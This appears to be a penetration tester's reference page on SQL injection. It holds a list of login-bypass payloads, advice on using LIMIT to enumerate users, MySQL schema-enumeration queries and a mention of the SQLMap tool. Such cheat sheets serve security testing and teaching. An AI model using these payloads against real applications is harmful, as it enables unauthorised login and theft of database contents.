# SQL Injection

This exploit takes advantage of the interaction of a server application with a backend database.  If inputs are not correctly sanitised, then an attacker can modify a query sent to a database and use it to perform data exfiltration or break application logic.

![](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)

## Login Bypasses

For login forms, if they're vulnerable to SQL Injection, the options can range from data exfiltration, to simply bypassing the login forms entirely. Note that the comment type for SQL databases can vary, so it's worth trying both `--` and `#`.  A number of the below are worth trying:

```
' or '1'='1
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

**Source**: [https://xapax.gitbooks.io/security/content/sql-injections.html](https://xapax.gitbooks.io/security/content/sql-injections.html)

If the backend code is only expecting a single result from the query, a number of the above will fail.  If this is the case then using `LIMIT 0,1` at the end of the expression will reduce the result returned to a single element.  You can then vary the first parameter to enumerate different users.

## Database Enumeration

### MYSQL

```sql
select column_name from information_schema.columns
select table_name from information_schema.tables
```

# Tooling

There's not much to mention here other than [SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage), which is quite disgusting in how well it works.  Pointing it at a remote url will cause the application to enumerate and then return any found injection points.

## Further Reading

[OWASP - SQL Injection](https://www.owasp.org/index.php/SQL_Injection)  
[HackTheBox - Charon](https://www.gitbook.com/book/reboare/booj-security/edit#)

